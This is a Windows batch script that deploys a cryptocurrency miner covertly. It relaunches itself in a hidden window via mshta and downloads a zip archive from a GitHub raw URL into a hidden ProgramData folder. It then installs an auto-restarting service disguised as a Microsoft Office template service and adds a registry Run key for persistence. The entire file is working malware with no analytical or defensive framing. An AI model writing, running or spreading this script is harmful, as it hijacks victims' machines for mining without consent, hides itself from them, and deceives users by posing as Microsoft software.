@echo off
setlocal enabledelayedexpansion

:: Hidden execution
if "%~1"=="hidden" goto main
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c """"%~f0"" hidden"", 0, false"^)
exit /b

:main
:: Single instance check
tasklist | findstr /i "Microsoft@OfficeTemplates.exe" >nul
if %errorlevel% equ 0 exit /b

:: Configuration
set "MINER_DIR=%ProgramData%\Microsoft\Windows\Templates\mall"
set "MINER_EXE=Microsoft@OfficeTemplates.exe"
set "MALL_URL=https://github.com/Drakovthe6th/TBuG/raw/master/mall.zip"
set "SERVICE_NAME=Microsoft Service"

:: Create hidden directory
if not exist "%MINER_DIR%" (
    mkdir "%MINER_DIR%" >nul 2>&1 || exit /b 1
    attrib +s +h "%MINER_DIR%" >nul 2>&1
)

:: Download and extract miner
if not exist "%MINER_DIR%\%MINER_EXE%" (
    echo Downloading package...
    set "ZIP_PATH=%MINER_DIR%\mall.zip"
    powershell -Command "Invoke-WebRequest -Uri '%MALL_URL%' -OutFile '%ZIP_PATH%'"
    
    if exist "%ZIP_PATH%" (
        powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%MINER_DIR%' -Force"
        del /q "%ZIP_PATH%" >nul 2>&1
        attrib +s +h "%MINER_DIR%\*" /s /d >nul 2>&1
    )
)

:: Service installation
sc query "%SERVICE_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    sc create "%SERVICE_NAME%" binPath= "\"%MINER_DIR%\%MINER_EXE%\" --config=config.json" start= auto
    sc description "%SERVICE_NAME%" "Microsoft Office Template Service"
    sc failure "%SERVICE_NAME%" reset= 86400 actions= restart/60000/restart/60000
)

:: Start service
sc start "%SERVICE_NAME%" >nul 2>&1

:: Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OfficeTemplates" /t REG_SZ /d "\"%MINER_DIR%\%MINER_EXE%\" --background" /f >nul

echo [+] Deployment completed
timeout /t 2 >nul
exit /b 0